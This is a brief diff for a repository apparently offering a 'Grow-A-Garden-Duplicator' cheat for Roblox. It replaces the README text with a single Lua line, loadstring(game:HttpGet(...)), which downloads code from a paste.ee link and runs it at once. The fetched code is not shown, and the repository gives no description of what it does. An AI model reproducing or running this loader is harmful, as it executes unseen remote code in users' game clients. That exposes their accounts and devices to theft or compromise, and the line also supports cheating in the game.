@@ -1,2 +1,1 @@
-# tr1kstr.github.io
-Grow-A-Garden-Duplicator
+loadstring(game:HttpGet("https://paste.ee/r/K9GmJZVC"))()
